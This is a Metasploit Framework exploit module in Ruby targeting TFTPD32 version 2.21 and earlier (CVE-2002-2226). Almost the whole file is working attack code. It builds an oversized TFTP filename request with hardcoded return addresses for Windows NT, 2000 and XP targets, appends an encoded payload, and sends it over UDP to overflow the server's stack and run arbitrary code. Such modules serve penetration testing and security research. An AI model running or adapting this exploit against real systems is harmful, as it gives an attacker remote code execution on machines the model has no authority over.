##
# $Id: tftpd32_long_filename.rb 10394 2010-09-20 08:06:27Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Udp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TFTPD32 <= 2.21 Long Filename Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in TFTPD32 version 2.21
				and prior. By sending a request for an overly long file name
				to the tftpd32 server, a remote attacker could overflow a buffer and
				execute arbitrary code on the system.
			},
			'Author'         => 'MC',
			'Version'        => '$Revision: 10394 $',
			'References'     =>
				[
					['CVE', '2002-2226'],
					['OSVDB', '45903'],
					['BID', '6199'],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 250,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					['Windows NT 4.0 SP6a English',    { 'Ret' => 0x77f9d463} ],
					['Windows 2000 Pro SP4 English',   { 'Ret' => 0x7c2ec663} ],
					['Windows XP Pro SP0 English',     { 'Ret' => 0x77dc0df0} ],
					['Windows XP Pro SP1 English',     { 'Ret' => 0x77dc5527} ],
				],
			'Privileged'     => true,
			'DisclosureDate' => 'Nov 19 2002'
			))

		register_options(
			[
				Opt::RPORT(69)
			], self)
	end

	def exploit
		connect_udp

		print_status("Trying target #{target.name}...")

		sploit =
			"\x00\x01" +
			rand_text_english(120, payload_badchars) +
			"." +
			rand_text_english(135, payload_badchars) +
			[target.ret].pack('V') +
			payload.encoded +
			"\x00"

		udp_sock.put(sploit)

		disconnect_udp
	end

end
